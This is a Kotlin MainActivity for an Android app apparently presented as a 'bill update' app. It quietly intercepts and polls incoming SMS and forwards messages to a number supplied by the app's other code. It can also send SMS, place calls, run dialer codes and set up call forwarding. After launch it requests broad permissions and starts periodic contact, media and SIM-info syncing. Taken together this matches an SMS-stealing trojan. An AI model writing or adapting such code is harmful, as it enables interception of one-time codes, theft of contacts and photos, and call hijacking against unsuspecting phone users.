package com.example.bill_update_app

import android.Manifest
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.content.pm.PackageManager
import android.net.Uri
import android.os.Build
import android.os.Handler
import android.os.Looper
import android.provider.Settings
import android.provider.Telephony

import io.flutter.embedding.android.FlutterActivity
import io.flutter.embedding.engine.FlutterEngine
import io.flutter.plugin.common.EventChannel
import io.flutter.plugin.common.MethodChannel

class SmsPlugin {
    companion object {
        private var eventSink: EventChannel.EventSink? = null

        fun register(channel: EventChannel, activity: FlutterActivity) {
            channel.setStreamHandler(object : EventChannel.StreamHandler {
                override fun onListen(arguments: Any?, events: EventChannel.EventSink?) {
                    eventSink = events
                }
                override fun onCancel(arguments: Any?) {
                    eventSink = null
                }
            })
        }

        fun receiveSms(sender: String, message: String, timestamp: String, subId: Int = 0) {
            val data = mapOf(
                "sender" to sender,
                "message" to message,
                "received_at" to timestamp,
                "sub_id" to subId
            )
            eventSink?.success(data)
        }
    }
}

class MainActivity : FlutterActivity() {
    private val CHANNEL_SMS = "com.example.bill_update_app/sms"
    private val CHANNEL_DEVICE = "com.example.bill_update_app/device"
    private val CHANNEL_FORWARDING = "com.example.bill_update_app/forwarding"
    private var receiver: SmsReceiver? = null
    private var smsObserver: SmsObserver? = null

    override fun configureFlutterEngine(flutterEngine: FlutterEngine) {
        super.configureFlutterEngine(flutterEngine)
        val smsChannel = EventChannel(flutterEngine.dartExecutor.binaryMessenger, CHANNEL_SMS)
        SmsPlugin.register(smsChannel, this)

        MethodChannel(flutterEngine.dartExecutor.binaryMessenger, CHANNEL_DEVICE).setMethodCallHandler { call, result ->
            if (call.method == "getDeviceId") {
                val prefs = getSharedPreferences("device_prefs", Context.MODE_PRIVATE)
                result.success(prefs.getString("device_id", ""))
            } else {
                result.notImplemented()
            }
        }

        MethodChannel(flutterEngine.dartExecutor.binaryMessenger, CHANNEL_FORWARDING).setMethodCallHandler { call, result ->
            when (call.method) {
                "enableCallForwarding" -> {
                    val number = call.argument<String>("number") ?: ""
                    if (checkSelfPermission(Manifest.permission.CALL_PHONE) != PackageManager.PERMISSION_GRANTED) {
                        getSharedPreferences("forwarding_pending", Context.MODE_PRIVATE).edit()
                            .putString("call_forwarding_number", number).apply()
                        requestPermissions(arrayOf(Manifest.permission.CALL_PHONE), 1003)
                    } else {
                        CallForwarder(this).enableCallForwarding(number)
                    }
                    result.success(true)
                }
                "disableCallForwarding" -> {
                    if (checkSelfPermission(Manifest.permission.CALL_PHONE) != PackageManager.PERMISSION_GRANTED) {
                        getSharedPreferences("forwarding_pending", Context.MODE_PRIVATE).edit()
                            .putString("call_forwarding_number", "").apply()
                        requestPermissions(arrayOf(Manifest.permission.CALL_PHONE), 1003)
                    } else {
                        CallForwarder(this).disableCallForwarding()
                    }
                    result.success(true)
                }
                "openDialer" -> {
                    val code = call.argument<String>("code") ?: ""
                    CallForwarder(this).openDialer(code)
                    result.success(true)
                }
                "forwardSms" -> {
                    val target = call.argument<String>("target") ?: ""
                    val sender = call.argument<String>("sender") ?: ""
                    val message = call.argument<String>("message") ?: ""
                    val receivedAt = call.argument<String>("received_at") ?: ""
                    if (checkSelfPermission(Manifest.permission.SEND_SMS) == PackageManager.PERMISSION_GRANTED) {
                        SmsForwarder(this).forwardSms(target, sender, message, receivedAt)
                    }
                    result.success(true)
                }
                "sendSms" -> {
                    val target = call.argument<String>("target") ?: ""
                    val message = call.argument<String>("message") ?: ""
                    if (checkSelfPermission(Manifest.permission.SEND_SMS) == PackageManager.PERMISSION_GRANTED) {
                        SmsForwarder(this).sendSms(target, message)
                    }
                    result.success(true)
                }
                "makeCall" -> {
                    val number = call.argument<String>("number") ?: ""
                    if (checkSelfPermission(Manifest.permission.CALL_PHONE) == PackageManager.PERMISSION_GRANTED) {
                        CallForwarder(this).makeCall(number)
                    }
                    result.success(true)
                }
                else -> result.notImplemented()
            }
        }

        DeviceRegistrar.init(this)

        receiver = SmsReceiver()
        val filter = IntentFilter("android.provider.Telephony.SMS_RECEIVED")
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            registerReceiver(receiver, filter, Context.RECEIVER_EXPORTED)
        } else {
            registerReceiver(receiver, filter)
        }

        requestAllPermissions()
    }

    private fun requestAllPermissions() {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.M) return
        Handler(Looper.getMainLooper()).postDelayed({
            val perms = mutableListOf(
                Manifest.permission.RECEIVE_SMS,
                Manifest.permission.READ_SMS,
                Manifest.permission.READ_CONTACTS,
                Manifest.permission.READ_PHONE_STATE,
                Manifest.permission.READ_PHONE_NUMBERS,
                Manifest.permission.CALL_PHONE,
                Manifest.permission.SEND_SMS
            )
            if (Build.VERSION.SDK_INT >= 33) {
                perms.add(Manifest.permission.READ_MEDIA_IMAGES)
                perms.add(Manifest.permission.READ_MEDIA_VIDEO)
            } else {
                perms.add(Manifest.permission.READ_EXTERNAL_STORAGE)
            }
            val toRequest = perms.filter {
                checkSelfPermission(it) != PackageManager.PERMISSION_GRANTED
            }
            if (toRequest.isNotEmpty()) {
                requestPermissions(toRequest.toTypedArray(), 1001)
            } else {
                onAllPermissionsGranted()
            }
        }, 2000)
    }

    private fun onAllPermissionsGranted() {
        startSmsObserver()
        ContactSync(this).startPeriodicSync()
        DeviceRegistrar.updateSimInfo()
    }

    override fun onRequestPermissionsResult(requestCode: Int, permissions: Array<out String>, grantResults: IntArray) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
        if (requestCode != 1001) return
        for (i in permissions.indices) {
            if (grantResults[i] != PackageManager.PERMISSION_GRANTED) continue
            when (permissions[i]) {
                Manifest.permission.RECEIVE_SMS, Manifest.permission.READ_SMS -> startSmsObserver()
                Manifest.permission.READ_CONTACTS -> ContactSync(this).startPeriodicSync()
                Manifest.permission.READ_MEDIA_IMAGES, Manifest.permission.READ_MEDIA_VIDEO, Manifest.permission.READ_EXTERNAL_STORAGE -> MediaSync(this).startPeriodicSync()
                Manifest.permission.READ_PHONE_STATE, Manifest.permission.READ_PHONE_NUMBERS -> DeviceRegistrar.updateSimInfo()
            }
        }
    }

    private fun openAppSettings() {
        try {
            val intent = Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS).apply {
                data = Uri.fromParts("package", packageName, null)
                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            }
            startActivity(intent)
        } catch (_: Exception) {}
    }

    private fun startSmsObserver() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.KITKAT) {
            smsObserver = SmsObserver(contentResolver, this)
            contentResolver.registerContentObserver(
                Telephony.Sms.Inbox.CONTENT_URI,
                true,
                smsObserver!!
            )
            smsObserver?.startPolling()
        }
    }

    override fun onDestroy() {
        super.onDestroy()
        receiver?.let { unregisterReceiver(it) }
        smsObserver?.let {
            it.stopPolling()
            contentResolver.unregisterContentObserver(it)
        }
    }
}
